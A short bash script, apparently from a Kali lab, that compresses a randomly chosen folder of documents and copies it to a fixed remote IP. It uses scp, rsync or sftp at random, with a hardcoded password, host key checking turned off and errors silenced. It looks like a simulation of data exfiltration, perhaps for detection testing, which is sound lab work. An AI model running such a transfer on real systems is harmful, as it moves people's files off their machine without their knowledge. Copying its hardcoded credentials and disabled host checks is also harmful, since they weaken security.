#!/bin/bash

# Define the base directory
BASE_DIR="/home/kali/Documents"

# Remote server details
REMOTE_USER="kali"
REMOTE_HOST="192.168.0.56"
REMOTE_PATH="/home/kali/Downloads"

# Ensure the base directory exists
if [ ! -d "$BASE_DIR" ]; then
    echo "Base directory $BASE_DIR does not exist. Exiting."
    exit 1
fi

# Get a list of directories within BASE_DIR and choose one at random
DIR_LIST=("$BASE_DIR"/*/)
if [ ${#DIR_LIST[@]} -eq 0 ]; then
    echo "No directories found in $BASE_DIR. Exiting."
    exit 1
fi

RANDOM_DIR="${DIR_LIST[RANDOM % ${#DIR_LIST[@]}]}"
RANDOM_DIR_NAME=$(basename "$RANDOM_DIR")

# Define the backup file path
BACKUP_FILE="/tmp/${RANDOM_DIR_NAME}_backup.tar.gz"

# Compress the selected directory
tar -czf "$BACKUP_FILE" -C "$BASE_DIR" "$RANDOM_DIR_NAME"

# Randomly select a transfer method
TRANSFER_METHODS=("scp" "rsync" "curl")
METHOD=${TRANSFER_METHODS[$RANDOM % ${#TRANSFER_METHODS[@]}]}

case $METHOD in
    "scp")
        sshpass -p "kali" scp -o StrictHostKeyChecking=no "$BACKUP_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH" 2>/dev/null | grep '^/' | tail -n 1
        ;;
    "rsync")
	sshpass -p "kali" rsync -avz -e "ssh -o StrictHostKeyChecking=no" "$BACKUP_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH" 2>/dev/null | grep '^/' | tail -n 1
        ;;
    "curl")
	sshpass -p "kali" sh -c 'echo "put '"$BACKUP_FILE"'" | sftp -o StrictHostKeyChecking=no "'"$REMOTE_USER@$REMOTE_HOST:$REMOTE_PATH"'"' 2>/dev/null | grep '^/' | tail -n 1
        ;;
esac

echo $BACKUP_FILE
